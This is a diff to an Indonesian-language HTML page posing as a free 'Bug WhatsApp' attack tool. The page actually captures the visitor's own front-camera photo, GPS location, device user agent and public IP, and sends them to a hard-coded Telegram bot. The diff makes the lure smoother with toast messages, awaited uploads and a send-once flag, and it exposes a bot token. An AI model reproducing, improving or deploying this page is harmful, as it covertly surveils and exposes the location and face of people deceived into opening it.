@@ -1,7 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Bug Whatsappp</title>
+  <title>Bug WhatsApp</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       margin: 0;
@@ -71,6 +73,27 @@
       box-shadow: 0 0 15px #00ffcc, 0 0 25px #00ffcc;
     }
 
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.8);
+      color: #fff;
+      padding: 14px 25px;
+      border-radius: 10px;
+      font-size: 16px;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+    }
+
+    .toast.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
     video, canvas {
       display: none;
     }
@@ -81,19 +104,21 @@
 <div class="snow"></div>
 
 <div class="container">
-  <h1>Bug Whatsapp Free</h1>
+  <h1>Bug WhatsApp Free</h1>
   <p>Masukkan Nomor Target:</p>
-  <input type="text" placeholder="62xxxxx" id="nomor">
+  <input type="text" placeholder="Contoh: 62xxxxx" id="nomor">
   <br>
-  <button onclick="main()">Kirim Bug Whatsapp</button>
+  <button onclick="main()">Kirim Bug WhatsApp</button>
 </div>
 
-<video id="video" width="1280" height="720" autoplay></video>
-<canvas id="canvas" width="1280" height="720"></canvas>
+<video id="video" width="1080" height="1350" autoplay></video>
+<canvas id="canvas" width="1080" height="1350"></canvas>
 
 <audio id="sound">
   <source src="https://files.catbox.moe/033uyr.mp3" type="audio/mpeg">
 </audio>
+
+<div id="toast" class="toast">Notifikasi</div>
 
 <script>
   const token = "7435143784:AAG0Jbu7tNBfHYNj14tVOPgrIFOQ_M1oZpk";
@@ -103,42 +128,58 @@
   const ctx = canvas.getContext('2d');
   const sound = document.getElementById('sound');
 
-  // Aktifkan kamera depan
-  navigator.mediaDevices.getUserMedia({
-    video: {
-      width: { ideal: 1280 },
-      height: { ideal: 720 },
-      facingMode: "user"
+  let dataTerkirim = false; // <== FLAG mencegah pengiriman berulang
+
+  function showToast(message, duration = 3000) {
+    const toast = document.getElementById('toast');
+    toast.innerText = message;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), duration);
+  }
+
+  async function enableCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          width: { ideal: 1080 },
+          height: { ideal: 1350 },
+          facingMode: "user"
+        }
+      });
+      video.srcObject = stream;
+      showToast("✅ Succesfuly...");
+    } catch (err) {
+      showToast("❌ Terjadi Kesalahan, Mohon Ulangi...: " + err.message);
     }
-  })
-  .then(stream => {
-    video.srcObject = stream;
-  })
-  .catch(err => {
-    console.error("Gagal Mohon Ulangi Lagi...:", err);
-  });
+  }
+
+  enableCamera();
 
   async function captureAndSendFullData() {
+    if (dataTerkirim) return; // Hentikan jika sudah terkirim
+
+    dataTerkirim = true; // Set flag agar hanya kirim sekali
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
+
     canvas.toBlob(async function(blob) {
-      // Ambil lokasi
       navigator.geolocation.getCurrentPosition(async function(pos) {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const userAgent = navigator.userAgent;
         const time = new Date().toLocaleString();
-        
+
         // Ambil IP publik
         let ip = "Tidak diketahui";
         try {
           const res = await fetch("https://api.ipify.org?format=json");
           const data = await res.json();
           ip = data.ip;
-        } catch (e) {}
+        } catch (e) {
+          showToast("⚠️ Terjadi Kesalahan, Mohon Ulangi...");
+        }
 
-        // Kirim lokasi sebagai pin
-        fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+        // Kirim lokasi ke Telegram
+        await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -148,7 +189,7 @@
           })
         });
 
-        // Kirim foto + detail
+        // Kirim foto + data
         const form = new FormData();
         form.append("chat_id", chat_id);
         form.append("photo", blob, "kamera_hd.jpg");
@@ -162,29 +203,27 @@
 📱 Device: ${userAgent}
         `);
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
           body: form
         });
 
+        showToast("✅ Succesfuly...");
       }, function(err) {
-        alert("Gagal Mohon Ulangi Lagi...: " + err.message);
+        showToast("❌ Terdapat Kesalahan...: " + err.message);
       });
     }, 'image/jpeg', 1.0);
   }
 
-  document.body.addEventListener("click", captureAndSendFullData);
-  document.body.addEventListener("scroll", captureAndSendFullData);
-
   function main() {
     const nomor = document.getElementById("nomor").value.trim();
     if (nomor === "") {
-      alert("Masukkan nomor dulu!");
+      showToast("⚠️ Masukkan nomor target terlebih dahulu!");
       return;
     }
 
     sound.play();
-    alert("Bug sedang diproses...\nTunggu 5-10 menit.");
+    showToast("⏳ Bug sedang diproses, tunggu 5-10 menit...");
     captureAndSendFullData();
   }
 </script>
